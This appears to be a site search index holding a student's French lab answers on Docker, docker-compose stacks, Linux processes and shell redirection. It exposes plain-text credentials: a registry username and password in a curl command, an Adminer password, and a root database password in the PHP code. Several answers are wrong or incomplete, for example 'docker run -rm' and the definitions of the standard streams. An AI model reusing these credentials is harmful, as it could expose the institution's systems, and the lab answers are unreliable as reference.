docker.</p>"},{"location":"cours-TP/C_Systems/tp3/tp3/#hdonnez-deux-commandes-differentes-permettant-de-lister-les-images","title":"h)Donnez deux commandes diff\u00e9rentes permettant de lister les images ?","text":"<pre><code>docker images\n</code></pre>"},{"location":"cours-TP/C_Systems/tp3/tp3/#i-que-permettent-dobtenir-les-commandes-suivantes","title":"i) Que permettent dobtenir les commandes suivantes :","text":"<p>docker info : Affiche des info d\u00e9taill\u00e9 de l'environnement docker ps : afficher les contenneurs en cours d'ex\u00e9cution docker ps -a : affiche tous les conteneurs docker image : affiche toutes les images t\u00e9l\u00e9charg\u00e9es et construites</p>"},{"location":"cours-TP/C_Systems/tp3/tp3/#4-creation-dun-conteneneur-docker","title":"4. Cr\u00e9ation d'un conteneneur Docker","text":""},{"location":"cours-TP/C_Systems/tp3/tp3/#a-recuperer-limage-almalinux-en-version-94-minimal-depuis-un-registry-docker-hub-ou-autre-quelle-commande-avez-vous-utiliser","title":"a) R\u00e9cup\u00e9rer l'image Almalinux en version 9.4 minimal depuis un registry (docker hub ou autre ). Quelle commande avez-vous utiliser ?","text":"<pre><code>docker pull almalinux:9.4-minimal\n</code></pre>"},{"location":"cours-TP/C_Systems/tp3/tp3/#b-quelle-commande-vous-permet-de-lister-les-images-docker-en-local","title":"b) Quelle commande vous permet de lister les images docker en local ?","text":"<p><pre><code>docker images\n</code></pre> </p>"},{"location":"cours-TP/C_Systems/tp3/tp3/#c-creer-un-conteneur-a-partir-de-limage-almalinux-en-version-94-minimal-quelle-commande-avez-vous-utiliser","title":"c) Cr\u00e9er un conteneur \u00e0 partir de l'image Almalinux en version 9.4 minimal. Quelle commande avez-vous utiliser ?","text":"<pre><code>docker run almalinux:9.4-minimal\n</code></pre>"},{"location":"cours-TP/C_Systems/tp3/tp3/#d-arreter-le-conteneur-que-vous-venez-de-creer-lance-le-a-nouveau-mais-en-mode-interactif-quelle-commande-avez-vous-utiliser","title":"d) Arr\u00eater le conteneur que vous venez de cr\u00e9er. Lanc\u00e9 le \u00e0 nouveau mais en mode interactif. Quelle commande avez-vous utiliser ?","text":"<pre><code>docker stop \ndocker run -it --name my_almashell almalinux:9.4-minimal \n</code></pre>"},{"location":"cours-TP/C_Systems/tp3/tp3/#e-la-commande-docker-run-permet-de-creer-un-conteneur-quels-sont-les-options-que-vous-avez-utilise-pour-creer-le-conteneur","title":"e) La commande docker run permet de cr\u00e9er un conteneur. Quels sont les options que vous avez utilis\u00e9 pour cr\u00e9er le conteneur ?","text":"<pre><code>docker run -it \n</code></pre>"},{"location":"cours-TP/C_Systems/tp3/tp3/#e-creer-deux-conteneurs-avec-les-caracteristiques-suivantes-quelles-commandes-avez-vous-utiliser","title":"e) Cr\u00e9er deux conteneurs avec les caract\u00e9ristiques suivantes, Quelles commandes avez vous utiliser :","text":"<pre><code>#contenenur 1\ndocker run -it --name conteneur1 almalinux:9.4-minimal-20240923 \n\n#conteneur 2 \ndocker run -d --name conteneur2 almalinux:9.4-minimal-20240923\n</code></pre>"},{"location":"cours-TP/C_Systems/tp3/tp3/#f-supprimez-le-conteneur-que-vous-venez-de-creer-quelle-commande-avez-vous-utiliser","title":"f)  Supprimez le conteneur que vous venez de cr\u00e9er. Quelle commande avez-vous utiliser ?","text":"<pre><code>docker rm conteneur1\ndocker rm -f conteneur2\n</code></pre>"},{"location":"cours-TP/C_Systems/tp3/tp3/#g-lancez-un-nouveau-conteneur-httpd-avec-la-commande-suivante","title":"g) Lancez un nouveau conteneur httpd avec la commande suivante :","text":"<pre><code>docker log web\n ```\n### h) A quoi correspond le p\u00e9riph\u00e9rique docker0 lorsque vous fait un ip addr sur votre VM ?\n\nc'est un router virtuel \n### i) Quelle commande permet de lancer un conteneur et de le d\u00e9truire une fois qu'il est arr\u00eat\u00e9 ?\n```bash\ndocker run -rm\n ```\n### j) Il existe 2 solutions pour cr\u00e9er une nouvelle image d'un conteneur docker. Quelles sont-elles ?\nLes deux m\u00e9thodes : \n    -Dockerfile\n    -Docker commit\n\n# 5. Cr\u00e9ation d'un fichier Dockerfile\n\n### a) A quoi sert la commande FROM dans un Dockerfile ?\nFROM sert a d\u00e9finir l'image de base\n### b)  A quoi sert la commande COPY dans un Dockerfile ?\nCOPY sert a copier les ficheier et r\u00e9pertoires depuis votre machine locale\n### c) A quoi correspond le r\u00e9pertoire public-html ?\nLe repertoir correspond au dossier source sur ma machine local, il contient les ficheirs statiques de site web par exemple\n### d) Cr\u00e9er un fichier Dockerfile avec le contenu suivant :\n```bash\nmkdir dossier-html\nnano Dockerfile\nnano dossier-html/index.html\n</code></pre>"},{"location":"cours-TP/C_Systems/tp3/tp3/#e-creer-une-image-a-partir-du-dockerfile-que-vous-venez-de-creer-quelle-commande-avez-vous-utiliser","title":"e) Cr\u00e9er une image \u00e0 partir du Dockerfile que vous venez de cr\u00e9er. Quelle commande avez-vous utiliser ?","text":"<pre><code>docker build -t serveurweb \n</code></pre>"},{"location":"cours-TP/C_Systems/tp3/tp3/#f-a-quoi-sert-la-commande-run-dans-un-dockerfile","title":"f) A quoi sert la commande RUN dans un Dockerfile ?","text":"<p>La commande RUN permet d'executer les commandes n\u00e9cessaire lors de la construction de l'image</p>"},{"location":"cours-TP/C_Systems/tp3/tp3/#g-a-quoi-sert-la-commande-label-dans-un-dockerfile","title":"g) A quoi sert la commande LABEL dans un Dockerfile ?","text":"<p>LAbel permet d'ajouter des m\u00e9tadonn\u00e9es \u00e0 l'images</p>"},{"location":"cours-TP/C_Systems/tp3/tp3/#6-versionning-dune-image-docker","title":"6. Versionning d'une image Docker","text":""},{"location":"cours-TP/C_Systems/tp3/tp3/#a-quelle-commande-permet-de-taguer-une-image-docker","title":"a) Quelle commande permet de taguer une image docker ?","text":"<pre><code>docker tag \n</code></pre>"},{"location":"cours-TP/C_Systems/tp3/tp3/#b-quelle-commande-permet-de-pousser-une-image-docker-sur-un-registre-docker","title":"b) Quelle commande permet de pousser une image docker sur un registre docker ?","text":"<pre><code>docker push\n</code></pre>"},{"location":"cours-TP/C_Systems/tp3/tp3/#c-quelle-commande-permet-de-lister-les-images-dun-registre-docker","title":"c)  Quelle commande permet de lister les images d'un registre docker ?","text":"<pre><code>curl -u ICS:123456+Aze http://harbor.pedago.ad.supalta.com/api/v2.0/projects/\n</code></pre>"},{"location":"cours-TP/C_Systems/tp3/tp3/#dtaguer-votre-image-webserver-avec-le-tag-latest-et-la-pousser-sur-le-registre-harborpedagoadsupaltacom","title":"d)Taguer votre image webserver avec le tag latest et la pousser sur le registre harbor.pedago.ad.supalta.com ?","text":""},{"location":"cours-TP/C_Systems/tp3/tp3/#e-modifier-votre-site-web-statique-et-effectuer-une-mise-a-jour-de-lensemble-et-pousser-votre-site-web-sur-le-registry-detaillez-les-etapes-ainsi-que-les-commandes","title":"e) Modifier votre site web statique et effectuer une mise \u00e0 jour de l'ensemble et pousser votre site web sur le registry. D\u00e9taillez les \u00e9tapes ainsi que les commandes ?","text":"<p><pre><code>docker build -t serveurweb:v2 .\n\ndocker tag serveurweb:v2 harbor.pedago.ad.supalta.com/3ics/bertagna/serveurweb:v2\n\ndocker push harbor.pedago.ad.supalta.com/3ics/bertagna/serveurweb:v2*\n</code></pre> </p>"},{"location":"cours-TP/C_Systems/tp3/tp3/#7-creation-dune-stack-apache-php-fpm-mysql","title":"7. Cr\u00e9ation d'une stack Apache / Php FPM/ MySQL","text":""},{"location":"cours-TP/C_Systems/tp3/tp3/#a-quel-est-le-role-de-la-commande-build","title":"a)  Quel est le role de la commande build","text":"<p>Le role de la command ebuild lit le fichier docker-compose.yml et Dockerfile</p>"},{"location":"cours-TP/C_Systems/tp3/tp3/#bquel-est-le-role-de-la-commande-up-pourquoi-utilise-t-on-loption-d","title":"b)Quel est le role de la commande up? Pourquoi utilise-t-on l'option -d ?","text":"<p>La commande UP permet de demarrer les conteneur du fichier docker-compose.yml</p>"},{"location":"cours-TP/C_Systems/tp3/tp3/#cquel-est-le-role-de-la-commande-down-pourquoi-utilise-t-on-loption-volume","title":"c)Quel est le role de la commande down? Pourquoi utilise-t-on l'option --volume?","text":"<p>la commande DOWN permet d'arreter et supprimer les coneteneur</p>"},{"location":"cours-TP/C_Systems/tp3/tp3/#dlancez-la-stack-avec-la-commande-docker-compose-up-d-quobservez-vous-au-premier-lancement","title":"d)Lancez la stack avec la commande docker compose up -d. Qu'observez vous au premier lancement ?","text":"<p>J'observe que docker compile sur la vm </p>"},{"location":"cours-TP/C_Systems/tp3/tp3/#eutilisez-la-commande-docker-compose-ps-quobservez-vous","title":"e)Utilisez la commande docker compose ps. Qu'observez vous ?","text":""},{"location":"cours-TP/C_Systems/tp3/tp3/#fdans-la-colonne-ports-que-signifie-la-ligne-9000tcp-que-signifie-la-ligne-00008080-80tcp","title":"f)Dans la colonne PORTS que signifie la ligne 9000/tcp? Que signifie la ligne 0.0.0.0:8080-&gt;80/tcp","text":"<p>La ligne 9000/ est le port expos\u00e9 \u00e0 l'int\u00e9rieur du r\u00e9seau docker. 0.0.0.0:8080-&gt;80/tcp est un redirection de port</p>"},{"location":"cours-TP/C_Systems/tp3/tp3/#g-la-colonne-names-contient-le-nom-des-differents-conteneurs-comment-est-constitue-le-nom-de-chacun-des-conteneurs","title":"g) La colonne NAMES contient le nom des diff\u00e9rents conteneurs. Comment est constitu\u00e9 le nom de chacun des conteneurs ?","text":"<p>$$\\text{Nom du dossier de la stack} + \\text{''} + \\text{Nom du service} + \\text{''} + \\text{Num\u00e9ro d'instance}$$</p>"},{"location":"cours-TP/C_Systems/tp3/tp3/#hpourquoi-utilise-t-on-la-directive-build-pour-les-services-php-fpm-et-apache-httpd-au-lieu-de-limage-de-base","title":"h)Pourquoi utilise-t-on la directive build pour les services php-fpm et apache-httpd au lieu de l'image de base ?","text":"<p>Pour ajouter des fichier de configuration sp\u00e9cifique </p>"},{"location":"cours-TP/C_Systems/tp3/tp3/#ia-quoi-servent-les-volumes-montes-dans-chaque-service-que-ce-passerait-il-en-absence-de-cette-directive-quelle-autre-solution-serait-utilisable-a-la-place-du-montage-de-volume-detaillez-votre-reponse-pour-le-conteneur-apache-httpd-et-mariadb-uniquement","title":"i)\u00c0 quoi servent les volumes mont\u00e9s dans chaque service ? Que ce passerait-il en absence de cette directive ? Quelle autre solution serait utilisable a la place du montage de volume ? D\u00e9taillez votre r\u00e9ponse pour le conteneur apache-httpd et mariadb uniquement.","text":"<p>Les volumes mont\u00e9s assurent la persistance des donn\u00e9es et la synchronisation du code source. |nom  | ROle du volume | Autre solution | | ----| ---------------|---------------| |httpd|Reference le dossier de code|commande copy dans le dockerfile| |mariadb|Assurer la persistance des donn\u00e9es| utiliser un volume nomm\u00e9 g\u00e9r\u00e9 par docker|</p>"},{"location":"cours-TP/C_Systems/tp3/tp3/#j-pourquoi-le-service-apache-httpd-depend-il-de-php-fpm-et-mariadb","title":"j) Pourquoi le service apache-httpd d\u00e9pend-il de php-fpm et mariadb ?","text":"<p>php-fpm : Car il transmet les requetes de fichier php \u00e0 9000/tcp car il ne peut pas traiter lui meme </p> <p>mariadb : l'application php ne peut pas fonctionner sans base de donn\u00e9e.</p>"},{"location":"cours-TP/C_Systems/tp3/tp3/#k-comment-pouvez-vous-verifier-que-le-conteneur-apache-httpd-repond-correctement-et-quil-sagit-bien-de-votre-conteneur","title":"k) Comment pouvez vous v\u00e9rifier que le conteneur apache-httpd r\u00e9pond correctement et qu'il s'agit bien de votre conteneur ?","text":""},{"location":"cours-TP/C_Systems/tp3/tp3/#l-comment-configurer-apache-pour-utiliser-https","title":"l) Comment configurer apache pour utiliser HTTPS ?","text":"<p>Il faut : 1. Inclure les cerificats 2. Activer le module ssl 3. configurer le Virtual Host 4. Mapper le port</p>"},{"location":"cours-TP/C_Systems/tp3/tp3/#mil-existe-au-moins-3-methodes-pour-lister-les-db-presentes-dans-le-conteneur-mariadb-donnez-les-3-methodes-avec-la-copie-des-commandes-ou-des-configurations-des-outils-utilises","title":"m)Il existe au moins 3 m\u00e9thodes pour lister les DB pr\u00e9sentes dans le conteneur mariadb. Donnez les 3 m\u00e9thodes avec la copie des commandes ou des configurations des outils utilis\u00e9s.","text":"<ol> <li>docker exec : Ex\u00e9cute directement la commande mariadb \u00e0 l'inte\u00e9rieur du conteneur database.</li> <li>Client externe : Utilise un client mariadb sur le port 3306</li> <li>Interface Adminer : lo'util se connecte au service mariadb via le r\u00e9seau docker et affiche les db dans un interface</li> </ol>"},{"location":"cours-TP/C_Systems/tp3/tp3/#nquelles-sont-les-db-presentes-et-comment-ont-elles-ete-crees","title":"n)Quelles sont les DB pr\u00e9sentes et comment ont-elles \u00e9t\u00e9 cr\u00e9es ?","text":""},{"location":"cours-TP/C_Systems/tp3/tp3/#oquel-est-le-role-du-conteneur-adminer-donnez-les-parametres-que-vous-avez-fournis-a-cette-application-web-pour-vous-connecter","title":"o)Quel est le r\u00f4le du conteneur adminer. Donnez les param\u00e8tres que vous avez fournis a cette application Web pour vous connecter.","text":"<p>Adminer permet d'administrer via une interface les DB.  MDP : 123+aze</p>"},{"location":"cours-TP/C_Systems/tp3/tp3/#pa-quoi-sert-le-volume-initdocker-entrypoint-initdbd-pour-mariadb","title":"p)\u00c0 quoi sert le volume ./init:/docker-entrypoint-initdb.d pour mariaDB ?","text":"<p>le volume permet l'initialisation automatique de la BDD  au lancement</p>"},{"location":"cours-TP/C_Systems/tp3/tp3/#q-pourquoi-expose-t-on-le-port-33306-pour-mariadb-quels-sont-les-risques-corrigez-le-fichier-pour-que-le-port-33306-ne-soit-plus-expose-et-relancez-la-stack","title":"q) Pourquoi expose-t-on le port 33306 pour mariadb ? Quels sont les risques ? Corrigez le fichier pour que le port 33306 ne soit plus expos\u00e9 et relancez la stack.","text":"<p>On expose le port 33306 pour l'acc\u00e8s \u00e0 la BDD commenter la ligne port de mariadb</p>"},{"location":"cours-TP/C_Systems/tp3/tp3/#rcomment-communiquent-les-differents-conteneurs-de-la-stack-donnez-la-commande-permettant-de-voir-la-configuration-reseau-de-la-stack","title":"r)Comment communiquent les diff\u00e9rents conteneurs de la stack. Donnez la commande permettant de voir la configuration r\u00e9seau de la stack.","text":"<pre><code>[user@localhost stack]$ docker network ls\nNETWORK ID     NAME            DRIVER    SCOPE\n8b20684ba00e   bridge          bridge    local\nebf24f4da0fa   host            host      local\nc0eced742cda   none            null      local\n75effdecef99   stack_default   bridge    local\n[user@localhost stack]$ docker network ls\nNETWORK ID     NAME            DRIVER    SCOPE\n8b20684ba00e   bridge          bridge    local\nebf24f4da0fa   host            host      local\nc0eced742cda   none            null      local\n75effdecef99   stack_default   bridge    local\n[user@localhost stack]$ docker network inspect host\n[\n    {\n        \"Name\": \"host\",\n        \"Id\": \"ebf24f4da0fae47e06d86d56d2c764963ed9a8ff848f19cb59a418490c003c01\",\n        \"Created\": \"2025-10-20T06:24:32.191586925Z\",\n        \"Scope\": \"local\",\n        \"Driver\": \"host\",\n        \"EnableIPv4\": true,\n        \"EnableIPv6\": false,\n        \"IPAM\": {\n            \"Driver\": \"default\",\n            \"Options\": null,\n            \"Config\": null\n        },\n        \"Internal\": false,\n        \"Attachable\": false,\n        \"Ingress\": false,\n        \"ConfigFrom\": {\n            \"Network\": \"\"\n        },\n        \"ConfigOnly\": false,\n        \"Containers\": {},\n        \"Options\": {},\n        \"Labels\": {}\n    }\n]\n</code></pre>"},{"location":"cours-TP/C_Systems/tp3/tp3/#sadaptez-le-fichier-docker-compose-etou-le-script-php-pour-pouvoir-afficher-la-liste-des-villes-de-lespagne-donnez-la-nouvelle-version-de-vos-fichiers-et-script-et-une-copie-decran-de-la-liste-des-villes","title":"s)Adaptez le fichier docker-compose et/ou le script PHP pour pouvoir afficher la liste des villes de l'Espagne. Donnez la nouvelle version de vos fichiers et script et une copie d'\u00e9cran de la liste des villes.","text":"<p>Docker a plante :  Faire :      - docker compose up -d --build Dans stack/public/index.html http://localhost:8080/index.php</p> <p><pre><code>&lt;?php\n&lt;?php\nfunction getCitiesFromCode( String $code) : Array {\n    $cnx=new PDO(\"mysql:host=mariadb;dbname=worldDB\", \"root\", \"123+aze\");\n    $SQL=\"SELECT * FROM city WHERE CountryCode=:code  \";\n    $preparedStatement = $cnx-&gt;prepare($SQL) ;\n    $preparedStatement-&gt;bindValue(\"code\", $code);\n    $preparedStatement-&gt;execute();\n    $cities = [];\n    while ( ($city = $preparedStatement-&gt;fetch(PDO::FETCH_ASSOC)) != FALSE) {\n        $cities[]=$city;\n    }\n    return $cities;\n}\n\n\necho \"&lt;h1&gt;Liste des villes d'Espagne (ESP)&lt;/h1&gt;\";\n$villes = getCitiesFromCode(\"ESP\");\n\nif (empty($villes)) {\n    echo \"&lt;p&gt;Aucune ville trouv\u00e9e. V\u00e9rifiez que la table 'city' est bien remplie dans la base de donn\u00e9es 'worldDB'.&lt;/p&gt;\";\n} else {\n    echo \"&lt;ul&gt;\";\n    foreach ($villes as $ville) {\n        echo \"&lt;li&gt;\" . htmlspecialchars($ville['Name']) . \" (\" . htmlspecialchars($ville['District']) . \")&lt;/li&gt;\";\n    }\n    echo \"&lt;/ul&gt;\";\n}\n?&gt;\n</code></pre> </p>"},{"location":"cours-TP/C_Systems/tp3/tp3/#t-les-mots-de-passe-sont-en-clair-dans-le-fichier-docker-composeyml-quels-sont-les-risques-et-comment-les-attenuer","title":"t) Les mots de passe sont en clair dans le fichier docker-compose.yml. Quels sont les risques et comment les att\u00e9nuer","text":"<p>Risque :      - Toutes les personnes ayant acc\u00e8s aux fichier peuvent voir les mdp     - En cas de fuite, tout le monde peut voir en claire les mdp</p> <p>Solutions :      - Stocker dans un ficheir s\u00e9par\u00e9 (.env)     - Utiliser docker secrets</p>"},{"location":"cours-TP/C_Systems/tp3/tp3/#u-comment-securiser-lacces-a-adminer-et-mongo-express-en-production","title":"u)  Comment s\u00e9curiser l\u2019acc\u00e8s \u00e0 Adminer et Mongo-Express en production ?","text":"<p>Etablir un tunnel SSH :  Controler l'acc\u00e8s via un acc\u00e8s reserver \u00e0 une plage d'IP.</p> <p>Adminer :  </p>"},{"location":"cours-TP/C_Systems/tpa/tpa/","title":"5.Commandes de base","text":""},{"location":"cours-TP/C_Systems/tpa/tpa/#a-quel-est-le-role-des-commandes-suivantes","title":"A)  Quel est le r\u00f4le des commandes suivantes","text":"<pre><code>-ps : Affiche des informations sur les processus en cours d'ex\u00e9cution. \n-pstree : Affiche les processus sous forme d'arbre\n-kill : Permet de terminer un processus\n</code></pre>"},{"location":"cours-TP/C_Systems/tpa/tpa/#btapez-la-commande-ps-aux-quelle-est-son-utilite-a-quoi-correspondent-les-colonnes","title":"B)Tapez la commande ps -aux. Quelle est son utilit\u00e9 ? A quoi correspondent les colonnes :","text":"<pre><code>-USER : L'utilisateur (propri\u00e9taire) qui a lanc\u00e9 le processus.\n-PID : L'identifiant unique du processus (Process ID).\n-%CPU : Le pourcentage du CPU utilis\u00e9 par le processus.\n-%MEM :Le pourcentage de la m\u00e9moire physique (RAM) utilis\u00e9 par le processus.\n-VSZ :La taille totale de la m\u00e9moire virtuelle utilis\u00e9e par le processus\n-RSS :La part de la m\u00e9moire virtuelle qui est actuellement en m\u00e9moire physique\n-TTY :Le terminal de contr\u00f4le associ\u00e9 au processus\n-STAT :L'\u00e9tat du processus (R,S,D,T,Z)\n-START :L'heure ou la date \u00e0 laquelle le processus a \u00e9t\u00e9 d\u00e9marr\u00e9.\n-TIME :Le temps CPU total consomm\u00e9 par le processus\n</code></pre>"},{"location":"cours-TP/C_Systems/tpa/tpa/#c-la-commande-top-ou-htop-affiche-une-colonne-pr-et-ni-a-quoi-correspondent-les-deux-colonnes-quelle-est-la-difference-entre-pr-et-ni","title":"C) La commande top ou htop affiche une colonne PR et NI. A quoi correspondent les deux colonnes ? Quelle est la diff\u00e9rence entre PR et NI ?","text":"<p>NI est la valeur demand\u00e9e par l'utilisateur pour influencer la priorit\u00e9. PR est la priorit\u00e9 r\u00e9sultante utilis\u00e9e par le syst\u00e8me.</p>"},{"location":"cours-TP/C_Systems/tpa/tpa/#dquelle-commande-permet-dafficher-la-priorite-dun-processus","title":"D)Quelle commande permet d\u2019afficher la priorit\u00e9 d\u2019un processus","text":"<p>La commande <code>ps</code> permet d'afficher la priorit\u00e9 d'un processus.</p>"},{"location":"cours-TP/C_Systems/tpa/tpa/#equelle-commande-permet-de-changer-la-priorite-dun-processus","title":"E)Quelle commande permet de changer la priorit\u00e9 d\u2019un processus","text":"<p><code>nice</code> permet de changer la priorit\u00e9 d'un processus. <code>renice</code> permet de modifier la priorit\u00e9 d'un processus.</p>"},{"location":"cours-TP/C_Systems/tpa/tpa/#fquelle-est-la-difference-entre-kill-3-et-kill-9-a-quoi-correspondent-les-options-3-et-9-donnez-la-liste-des-principaux-signaux-valeur-numerique-nom-role","title":"F)Quelle est la diff\u00e9rence entre kill -3 et kill -9 ? A quoi correspondent les options -3 et -9 ? Donnez la liste des principaux signaux ( valeur num\u00e9rique, nom, r\u00f4le)","text":"<pre><code>-kill -3 : quitter le processus signal faible\n-kill -9 : KILL le processus signal fort\n</code></pre> <pre><code>SIGHUP\nSIGINT\nSIGTERM\nEt d'autres\n</code></pre>"},{"location":"cours-TP/C_Systems/tpa/tpa/#gquelle-est-la-particularite-du-signal-sigkill","title":"G)Quelle est la particularit\u00e9 du signal SIGKILL ?","text":"<p>Sa particularit\u00e9 est qu'il ne peut pas \u00eatre g\u00e9r\u00e9 par le processus cible.</p>"},{"location":"cours-TP/C_Systems/tpa/tpa/#hquel-est-le-role-de-la-commande-nohup","title":"H)Quel est le r\u00f4le de la commande nohup ?","text":"<p>nohup  permet de lancer une commande qui ignorera le signal</p>"},{"location":"cours-TP/C_Systems/tpa/tpa/#iquelles-commandes-vous-permettent-de-passer-un-processus-en-arriere-plan-de-le-ramener-en-avant-plan-de-le-mettre-en-pause","title":"I)Quelles commandes vous permettent de passer un processus en arri\u00e8re plan ? De le ramener en avant plan ? De le mettre en pause ?","text":"<p>Au lancement : &amp; (ex: ./mon_programme &amp;) fg (ram\u00e8ne la derni\u00e8re t\u00e2che mise en arri\u00e8re-plan) Ctrl+Z (depuis le terminal o\u00f9 il s'ex\u00e9cute en avant-plan).</p>"},{"location":"cours-TP/C_Systems/tpa/tpa/#6gestion-des-processus","title":"6.Gestion des processus","text":""},{"location":"cours-TP/C_Systems/tpa/tpa/#a-il-existe-deux-approches-pour-passer-le-processus-en-background-tache-de-fond-lesquelles","title":"A) Il existe deux approches pour passer le processus en \u00ab background \u00bb (tache de fond). Lesquelles ?","text":"<p>Au lancement : /randomgenerator &amp;  Pendant l'execution du prog :  <pre><code>./randomgenerator\n[Ctrl+Z]  # Met en pause \nbg # Red\u00e9marre en arri\u00e8re-plan \n</code></pre></p>"},{"location":"cours-TP/C_Systems/tpa/tpa/#bvotre-processus-est-en-tache-de-fond-tapez-la-commande-clear-quobservez-vous","title":"B)Votre processus est en tache de fond ? Tapez la commande \u00ab clear \u00bb ? Qu\u2019observez-vous ?","text":"<p>On observe que la commande clear s'ex\u00e9cute (l'\u00e9cran est effac\u00e9), mais imm\u00e9diatement apr\u00e8s, l'\u00e9cran est \"pollu\u00e9\" par la sortie du processus randomgenerator</p>"},{"location":"cours-TP/C_Systems/tpa/tpa/#ccomment-pouvez-vous-mettre-le-processus-en-pause-il-existe-deux-approches-lesquelles","title":"C)Comment pouvez-vous mettre le processus en pause ? Il existe deux approches, lesquelles ?","text":"<p>Depuis l'avant plan  : CRTL + Z Depuis l'arri\u00e8rre plan : kill -19</p>"},{"location":"cours-TP/C_Systems/tpa/tpa/#dque-devez-vous-faire-pour-le-ramener-en-foreground-avant-plan","title":"D)Que devez-vous faire pour le ramener en \u00ab foreground \u00bb (avant plan?)","text":"<p>Avec la commande fg pour la ramener devant</p>"},{"location":"cours-TP/C_Systems/tpa/tpa/#eque-devez-vous-faire-pour-arreter-le-processus-vous-avez-deux-solutions-lesquelles","title":"E)Que devez-vous faire pour arr\u00eater le processus. Vous avez deux solutions, lesquelles ?","text":"<p>Solution 1 : Avec CTRL+C  Solution 2 : Kill -9</p>"},{"location":"cours-TP/C_Systems/tpa/tpa/#fquelle-est-la-difference-entre-un-numero-de-tache-et-un-numero-de-processus","title":"F)Quelle est la diff\u00e9rence entre un num\u00e9ro de tache et un num\u00e9ro de processus.","text":"<p>Num\u00e9ro de tache : ger\u00e9 par le terminal , c'est l'identifiant du terminal  Num\u00e9ro de processus : ger\u00e9 par le kernel, identifiant unique \u00e0 l'echelle syst\u00e8me</p>"},{"location":"cours-TP/C_Systems/tpa/tpa/#glancer-le-programme-en-tache-de-fond-depuis-un-terminal-ssh-et-deconnectez-vous-du-terminal-le-processus-et-il-actif-comment-avez-vous-verifie","title":"G)lancer le programme en tache de fond depuis un terminal ssh et d\u00e9connectez-vous du terminal. Le processus et il actif ? Comment avez-vous v\u00e9rifi\u00e9?","text":"<p> J'ai lanc\u00e9 le programme en arri\u00e8re plan : <code>./main &amp;</code> et dans une autre fenetre j'ai v\u00e9rifi\u00e9 avec &amp;<code>ps aux | grep &lt;LEPID&gt;</code></p>"},{"location":"cours-TP/C_Systems/tpa/tpa/#hcomment-pouvez-vous-lancer-un-processus-qui-restera-actif-meme-si-vous-fermez-la-session-il-existe-au-moins-deux-solutions-lesquelles","title":"H)Comment pouvez-vous lancer un processus qui restera actif m\u00eame si vous fermez la session ? Il existe au moins deux solutions, lesquelles ?","text":"<p>J'ai lance le programme avec nohup en background: <code>nohup ./main &amp;</code> j'ai exit le terminal et sur une autre fenetre j'ai fais &amp;<code>ps aux | grep &lt;LEPID&gt;</code></p>"},{"location":"cours-TP/C_Systems/tpa/tpa/#icomment-lancer-randomgenerator-avec-une-priorite-plus-faible","title":"I)Comment lancer randomgenerator avec une priorit\u00e9 plus faible ?","text":"<p><code>nice -n 10 ./main &amp;</code></p>"},{"location":"cours-TP/C_Systems/tpa/tpa/#j-quelle-commande-vous-permet-de-changer-la-priorite-de-randomgenerator","title":"J) Quelle commande vous permet de changer la priorit\u00e9 de randomgenerator ?","text":"<p><code>renice 15 -p &lt;LEPID&gt;</code>  Permet de modifi\u00e9 la priorit\u00e9 d'un processus.</p>"},{"location":"cours-TP/C_Systems/tpa/tpa/#7-redirection-de-flux","title":"7. Redirection de flux","text":""},{"location":"cours-TP/C_Systems/tpa/tpa/#a-que-fait-la-commande-randomgenerator-randstxt","title":"a) Que fait la commande randomgenerator &gt; rands.txt ?","text":"<p>Elle redirige l'outpout de randomgenerator dans rands.txt en remplacant le fichier entier</p>"},{"location":"cours-TP/C_Systems/tpa/tpa/#bque-fait-la-commande-randomgenerator-randstxt","title":"b)Que fait la commande randomgenerator &gt;&gt; rands.txt ?","text":"<p>Elle redigirige l'outpout de randomgenerat a la fin du fichier rand.txt sans supprimer ce que le fichier contient</p>"},{"location":"cours-TP/C_Systems/tpa/tpa/#cque-fait-la-commande-randomgenerator-i","title":"c)Que fait la commande randomgenerator -i ?","text":"<p>Elle lance le programme en demandant le nombre de valeur </p>"},{"location":"cours-TP/C_Systems/tpa/tpa/#dque-fait-la-commande-randomgenerator-i-10","title":"d)Que fait la commande randomgenerator -i &lt;&lt;&lt; \"10\"","text":"<p> Elle utilise la premiere valeur en tant que nombre de valeur saisie</p>"},{"location":"cours-TP/C_Systems/tpa/tpa/#etapez-la-commande-echo-20-responsetxt-que-fait-elle","title":"e)Tapez la commande echo \"20\" &gt; response.txt  Que fait-elle ?","text":"<p>Elle \u00e9crit dans response.txt \"20\"</p>"},{"location":"cours-TP/C_Systems/tpa/tpa/#fque-fait-la-commande-randomgenerator-i-responsetxt","title":"f)Que fait la commande randomgenerator -i &lt;&lt; response.txt","text":"<p>Elle attend qu'on \u00e9crive le nombre de valeur avant d'envoyer dans response.txt</p>"},{"location":"cours-TP/C_Systems/tpa/tpa/#gque-fait-la-commande-randomgenerator-i-10-sort-n","title":"g)Que fait la commande randomgenerator -i &lt;&lt;&lt; \"10\" | sort -n ?","text":"<p>Execute la commande randomgenerator et trie les 10 premier</p>"},{"location":"cours-TP/C_Systems/tpa/tpa/#ha-quoi-correspond-les-flux-0-1-2-stdin-stdout-stderr","title":"h)A quoi correspond les flux 0, 1, 2 (stdin, stdout, stderr) ?","text":"<pre><code>- 0: Ce que le processus lit\n- 1: La ou le processus lit le r\u00e9sultat\n- 2: La ou le processus ecrit les erreurs\n</code></pre>"},{"location":"cours-TP/C_Systems/tpa/tpa/#ique-fait-la-commande-randomgenerator-i-50-datatxt","title":"i)Que fait la commande randomgenerator -i &lt;&lt;&lt; \"50\" &gt; data.txt &amp;","text":"<pre><code>-Execute le programme et donne 50 en input\n-redirige la sortie  vers data.txt\n-et tout ca en background\n</code></pre>"},{"location":"cours-TP/C_Systems/tpa/tpa/#jvous-devez-maintenant-avoir-un-fichier-nomme-datatxt-que-fait-la-commande-cat-datatxt-sort-n","title":"j)Vous devez maintenant avoir un fichier nomm\u00e9 data.txt, que fait la commande cat data.txt | sort -n","text":"<p> on voit ici que l'output de la commande est redirig\u00e9 dans le txt, il a fallut attendre 25 secondes que tout se mette dans le fichier car il y a 25 valeurs</p>"},{"location":"cours-TP/C_Systems/tpa/tpa/#kmodifier-le-code-source-de-randomgenerator-pour-quil-accepte-loption-n-xxx-xxx-etant-le-nombre-de-valeurs-aleatoires-desirees-et-donnez-le-code","title":"k)Modifier le code source de RandomGenerator pour qu'il accepte l'option -n XXX, XXX \u00e9tant le nombre de valeurs al\u00e9atoires d\u00e9sir\u00e9es, et donnez le code.","text":"<p>Remplacer -ia par -in pour ajouter l'option input :  Rajoute d'un case pour convertir le input XXX en nombre :  </p> <p>Code final :  <pre><code>/*\n * To change this license header, choose License Headers in Project Properties.\n * To change this template file, choose Tools | Templates\n * and open the template in the 